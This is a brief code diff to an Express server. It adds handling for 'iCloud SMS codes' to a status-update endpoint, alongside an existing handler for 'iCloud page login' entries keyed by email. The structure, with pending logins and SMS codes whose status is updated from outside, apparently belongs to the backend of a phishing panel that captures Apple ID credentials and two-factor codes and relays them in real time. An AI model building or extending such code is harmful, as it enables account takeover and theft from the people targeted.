@@ -313,6 +313,13 @@ app.post("/update-status", (req, res) => {
       return res.status(400).json({ error: "Missing email or status" });
     }
 
+    // ✅ Handle iCloud SMS codes (identifier is the code itself)
+    if (pendingCodes[email]) {
+      pendingCodes[email].status = status;
+      console.log(`✅ Updated pendingCodes[${email}].status = ${status}`);
+      return res.json({ ok: true, message: "SMS code status updated" });
+    }
+
     // ✅ Handle iCloud page login (pendingPage)
     if (pendingPage[email]) {
       pendingPage[email].status = status;
